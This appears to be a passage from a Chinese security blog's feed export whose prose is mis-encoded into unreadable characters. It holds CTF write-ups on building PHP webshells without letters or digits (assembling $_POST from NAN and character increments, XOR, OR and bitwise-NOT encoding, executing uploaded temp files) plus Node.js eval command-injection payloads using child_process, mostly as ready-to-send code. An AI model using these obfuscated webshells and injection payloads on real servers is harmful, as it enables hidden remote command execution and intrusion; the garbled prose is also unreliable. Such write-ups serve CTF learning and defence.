title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¤§è‡´æ€è·¯å°±æ˜¯å¦‚æ­¤ï¼Œå…‰å¬æ–‡ç« åˆ†æèƒ½å­¦åˆ°çš„ä¸œè¥¿æ˜¯å¾ˆæœ‰é™çš„ï¼Œæœ€åè¿˜æ˜¯éœ€è¦è‡ªå·±åŠ¨æ‰‹å»è°ƒè¯•ã€‚</p><p>åœ¨å†™è¿™ç¯‡æ–‡ç« ä¹‹å‰ä¹Ÿä¸çŸ¥é“ä¸€äº›ç»•è¿‡æ–¹æ³•ï¼Œåªæ˜¯åˆ†æäº†ä¸€ä¸‹fastjsonçš„åŸç†ï¼Œåé¢çœ‹åˆ°ç½‘ä¸Šçš„é‚£äº›æ–¹æ³•ï¼Œæ²¡æƒ³åˆ°æˆ‘ç«Ÿç„¶å‡‘å·§æŠŠè¿™äº›ç»•è¿‡payloadè‡ªå·±æå‡ºæ¥äº†ï¼Œè¿˜æ˜¯æœ‰ç‚¹å°é«˜å…´ã€‚æ‰€ä»¥è¯´çŸ¥é“åŸç†è¿˜æ˜¯å¾ˆé‡è¦çš„ã€‚<br>åœ¨ä¸‹ä¸€ç¯‡å°±ç ”ç©¶ä¸€ä¸‹fastjsonçš„ååºåˆ—åŒ–åˆ©ç”¨ï¼Œå’Œä¸€äº›ç»•è¿‡payload</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å†™è¿™ç¯‡æ–‡ç« å°±æ˜¯æ¥ç®€å•ç†è§£ä¸€ä¸‹ä»–ååºåˆ—åŒ–çš„åŸç†ï¼Œå†…æ ¸å®ç°&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="fastjson" scheme="http://example.com/categories/fastjson/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="fastjson" scheme="http://example.com/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>webshell-å¥‡æ·«æŠ€å·§ï¼ˆphpï¼‰</title>
    <link href="http://example.com/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/"/>
    <id>http://example.com/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/</id>
    <published>2022-11-29T10:32:17.000Z</published>
    <updated>2022-12-13T13:34:08.035Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—"><a href="#æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—" class="headerlink" title="æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—"></a>æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—</h2><p>é€šè¿‡booleanç±»å‹è¿›è¡ŒåŠ å‡<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="literal">true</span>+<span class="literal">true</span>) == <span class="number">2</span>);         <span class="comment">// D:\phpstudy_pro\WWW\a.php:2:boolean true</span></span><br></pre></td></tr></table></figure><br>ä»ä¸¤ä¸ªçœŸç›¸åŠ å¾—åˆ°äº†2ï¼Œé‚£ä¹ˆå¸ƒå°”ç±»å‹çš„éƒ½åº”è¯¥éƒ½å¯ä»¥è¿›è¡ŒåŠ å‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å•å¼•å·</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// æœªå®šä¹‰å˜é‡</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// æœªå®šä¹‰å¸¸é‡</span></span><br><span class="line"><span class="variable">$_</span> = _==_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// ä¸­æ‹¬å·</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// è·å–0</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>-<span class="variable">$_</span>;                         <span class="comment">// 0</span></span><br><span class="line"><span class="comment">// è·å–false</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);                       <span class="comment">// D:\phpstudy_pro\WWW\a.php:3:boolean false</span></span><br></pre></td></tr></table></figure><br>æ€»è€Œè¨€ä¹‹å°±æ˜¯æ‹¿ç€ä¸¤ä¸ªç±»å‹å»æ¯”è¾ƒï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å¤§äºå·å°äºå·ä¹‹ç±»çš„å»æ¯”è¾ƒ<br>å½“ç„¶æœ‰æ—¶å€™æœªå®šä¹‰çš„å˜é‡ã€å¸¸é‡ï¼Œä¹Ÿå¯ä»¥å½“ä½œfalseæ¥ç”¨<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;kaikaix&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$b</span>];                        <span class="comment">//è¾“å‡º k</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[_];                         <span class="comment">//è¾“å‡º k</span></span><br></pre></td></tr></table></figure></p><h2 id="æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰çš„å­—æ¯"><a href="#æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰çš„å­—æ¯" class="headerlink" title="æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰çš„å­—æ¯"></a>æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰çš„å­—æ¯</h2><h3 id="æ•°ç»„æ‹¼æ¥"><a href="#æ•°ç»„æ‹¼æ¥" class="headerlink" title="æ•°ç»„æ‹¼æ¥"></a>æ•°ç»„æ‹¼æ¥</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.[];                         <span class="comment">//å­—ç¬¦ä¸²ä¸æ•°ç»„æ‹¼æ¥å˜æˆArray</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>];                  <span class="comment">//falseä»£è¡¨0ï¼Œè¿™é‡Œå–åˆ°A</span></span><br><span class="line"><span class="variable">$___</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>);  <span class="comment">//3ä¸ªtrueç›¸åŠ ä¸º3</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="variable">$___</span>];                     <span class="comment">//è·å–åˆ°a</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„æ“ä½œå°±æ˜¯ä¸€äº›è‡ªåŠ æ“ä½œäº†ï¼Œè¿™æ ·å°±å¯ä»¥è·å–åˆ°æ‰€æœ‰çš„å­—æ¯äº†<br>åœ¨phpä¸­å­—æ¯æ˜¯å¯ä»¥è‡ªåŠ çš„ï¼ˆä¸èƒ½è‡ªå‡ï¼‰ï¼Œä½†æ˜¯ç‰¹æ®Šå­—ç¬¦ä¸è¡Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//å˜æˆb</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//è¿˜æ˜¯(</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œæˆ‘çªå‘å¥‡æƒ³ï¼Œæƒ³çœ‹çœ‹classç±»å‹èƒ½ä¸èƒ½æ‹¼æ¥å‡ºObjectå­—ç¬¦ä¸²ï¼Œnullèƒ½ä¸èƒ½æ‹¼æ¥å‡ºå­—ç¬¦ä¸²nullï¼Œç„¶è€Œå¹¶ä¸è¡Œï¼Œé‚£ä¹ˆå°±åªèƒ½å…ˆå‘Šä¸€æ®µè½</p><h3 id="åˆ©ç”¨æ•°å­¦é”™è¯¯"><a href="#åˆ©ç”¨æ•°å­¦é”™è¯¯" class="headerlink" title="åˆ©ç”¨æ•°å­¦é”™è¯¯"></a>åˆ©ç”¨æ•°å­¦é”™è¯¯</h3><p>phpä¸­0/0ä¼šè¿”å›NANï¼Œ1/0ä¼šè¿”å›INF<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//false/false æŠ¥é”™ NAN</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//å°†æŠ¥é”™ä¸å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²NAN</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//æ‰“å°å‡º NAN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//true/falseæŠ¥é”™ INF</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//å°†æŠ¥é”™ä¸å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²INF</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//æ‰“å°INF</span></span><br></pre></td></tr></table></figure><br>å½“ç„¶ä¸Šé¢çš„ä»£ç è¿˜æ˜¯æœ‰ç‚¹é•¿çš„ï¼Œå¯ä»¥ç”¨undefinedçš„å¸¸é‡æˆ–å˜é‡ç›¸é™¤ï¼Œå°±ä¼šç¼©çŸ­ä»£ç é•¿åº¦<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¸¸é‡</span></span><br><span class="line"><span class="variable">$_</span>=_/_;</span><br><span class="line"><span class="variable">$_</span>.=_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//è¾“å‡ºNAN_</span></span><br><span class="line"><span class="comment">//ç¼©çŸ­ä»£ç </span></span><br><span class="line"><span class="variable">$_</span>=(_/_._);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//è¾“å‡ºNAN_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å˜é‡</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//è¾“å‡ºNAN</span></span><br></pre></td></tr></table></figure><br>è¿™æ ·å¯ä»¥è·å–åˆ°NANçš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæå–ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯N<br>å› ä¸ºPOSTè¿™å‡ ä¸ªå­—æ¯éƒ½åœ¨Nåé¢ï¼Œé‚£ä¹ˆè¿›è¡Œä¸€äº›è‡ªåŠ æ“ä½œå°±å¯ä»¥è·å–åˆ°$_POSTäº†ï¼Œæˆ‘è¿™é‡ŒæŠ„ä¸€ä¸‹åˆ«çš„å¸ˆå‚…çš„ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(_/_._)[<span class="number">0</span>];                      <span class="comment">//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>;                            <span class="comment">//$o=++$aæ˜¯å…ˆæŠŠ$aè¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aå’Œ$oéƒ½æ˜¯O</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>.<span class="variable">$o</span>;                         <span class="comment">//$o=&gt;PO,$a=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//R</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POS,$a=&gt;S</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POST,$a=&gt;T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$o</span>;                            <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);                     <span class="comment">//$_POST[0]($_POST[_]);</span></span><br></pre></td></tr></table></figure><br>åœ¨è¿™é‡Œçš„å˜é‡åç§°æœ€åæ›¿æ¢æˆç‰¹æ®Šå­—ç¬¦å°±å¯ä»¥äº†<br>æ¯”å¦‚ä¸‹å›¾è¿™äº›<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/1.jpg" alt><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Ã‘</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Ã‘</span>;</span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</code></p><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p>å½“phpå®‰è£…äº†gettextæ‰©å±•ï¼Œè¿™ä¸ªæ‰©å±•ä¸­_()ç›¸å½“äºgettext()<br>ç›¸å…³æ–‡æ¡£ <a href="https://www.php.net/manual/en/book.gettext.php">https://www.php.net/manual/en/book.gettext.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];                       <span class="comment">//è·å–åˆ°N</span></span><br></pre></td></tr></table></figure><br>æœ€åä¸€äº›è‡ªåŠ çš„é¡ºåºæ“ä½œå¯ä»¥è®©ä½ çš„webshellæ›´çŸ­ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸ç»†è¯´äº†ï¼Œå› ä¸ºæˆ‘æ„Ÿè§‰æœ‰ç‚¹æ²¡å¿…è¦<br>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« çš„åº•éƒ¨<br><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah</a><br>ç›´æ¥ä¸Šä»£ç <br>72ä½å­—ç¬¦<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f1agaaa</code></p><p>68ä½å­—ç¬¦<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//å·§å¦™çš„æŠŠä¸¤æ¬¡$_++æ”¾åœ¨ä¸€èµ·</span></span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</code></p><h3 id="ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶"><a href="#ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶"></a>ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶</h3><p>å…·ä½“å‚è€ƒpç¥æ–‡ç« <br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ls&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><br>æ ¸å¿ƒåŸç†å°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ä¼šä¸´æ—¶ä¿å­˜åˆ°/tmp/phpXXXXXXä¸­ï¼Œåé¢çš„Xæ˜¯éšæœºå­—ç¬¦<br>[@-[]è¿™ä¸ªä»£è¡¨?æ˜¯ä»@-[ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„å¤§å†™å­—æ¯<br>é‚£ä¹ˆå‘½ä»¤æ‰§è¡Œå°±å¯ä»¥å»æ‰§è¡Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶</p><h2 id="ä½è¿ç®—"><a href="#ä½è¿ç®—" class="headerlink" title="ä½è¿ç®—"></a>ä½è¿ç®—</h2><h3 id="æˆ–"><a href="#æˆ–" class="headerlink" title="æˆ–"></a>æˆ–</h3><p>ä¸»è¦æ˜¯é€šè¿‡ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—å¾—åˆ°æ­£å¸¸å­—ç¬¦<br>æ¯”å¦‚<br><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)()</code><br>è¿ç®—å®Œä»¥åå°±æ˜¯<br><code>phpinfo()</code><br>è¿™é‡Œæœ‰ç›¸å…³çš„ä»£ç <br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96</a><br>å½“ç„¶åŒå¼•å·å¯ä»¥æ›¿æ¢ä¸ºå•å¼•å·<br>å¦‚æœæ˜¯ç›´æ¥å¤åˆ¶åˆ°phpæ–‡ä»¶ä¸­å»æ‰§è¡Œçš„è¯éœ€è¦å…ˆurl decodeæ‰è¡Œ<br><code>(&quot;    &quot;|&quot;```````&quot;)();</code></p><h3 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h3><p>å¼‚æˆ–ä¸æˆ–çš„åŸç†ç±»ä¼¼<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96</a></p><h3 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h3><p>è¿™é‡Œç”¨çš„yu22xçš„è„šæœ¬<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D</a><br>è¿™é‡Œæ˜¯ç”¨phpå‘½ä»¤è¡Œå»æ‰§è¡Œ<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/2.jpg" alt><br>å¦‚æœæ²¡æœ‰å‚æ•°å¯ä»¥æŠŠåé¢æ‹¬å·é‡Œé¢çš„ä¸œè¥¿åˆ é™¤<br><code>(~%8F%97%8F%96%91%99%90)();</code><br>åŒç†ï¼Œå¦‚æœæƒ³åœ¨phpä¸­æ‰§è¡Œï¼Œä¹Ÿè¦å…ˆurldecode</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—&quot;&gt;&lt;a href=&quot;#æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—&quot; class=&quot;headerlink&quot; title=&quot;æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—&quot;&gt;&lt;/a&gt;æ— æ•°å­—å­—æ¯è·å–æ‰€æœ‰æ•°å­—&lt;/h2&gt;&lt;p&gt;é€šè¿‡booleanç±»å‹è¿›è¡ŒåŠ å‡&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="php" scheme="http://example.com/categories/php/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="webshell" scheme="http://example.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-nodejs</title>
    <link href="http://example.com/2022/11/28/ctfshow-nodejs/"/>
    <id>http://example.com/2022/11/28/ctfshow-nodejs/</id>
    <published>2022-11-28T08:12:06.000Z</published>
    <updated>2022-12-04T21:03:51.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><span id="more"></span><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å‰é¢<br><code>name!==&#39;CTFSHOW&#39;</code><br>åé¢<br><code>item.username === name.toUpperCase</code><br>é‚£ä¹ˆç›´æ¥è¾“å…¥å°å†™ctfshowå’Œ123456å³å¯ç»•è¿‡</p><blockquote><p>åœ¨Character.toUpperCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚<br>åœ¨Character.toLowerCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚</p></blockquote><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>æŸ¥çœ‹æºç ï¼ŒçŸ¥é“å‚æ•°/?eval=<br>ä¼ å…¥å‚æ•°<br><code>eval=require(&#39;child_process&#39;).exec(&#39;id&#39;);</code><br><img src="/2022/11/28/ctfshow-nodejs/1.jpg" alt><br>å¯ä»¥çœ‹åˆ°æ˜¯object Object æ— å›æ˜¾<br>å› ä¸ºexecè¿”å›çš„æ˜¯ ChildProcess<br><a href="http://nodejs.cn/api/child_process.html">http://nodejs.cn/api/child_process.html</a><br>æŸ¥çœ‹æ–‡æ¡£å¯ä»¥æ›¿æ¢æˆå¦‚ä¸‹å‡½æ•°<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">output</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span 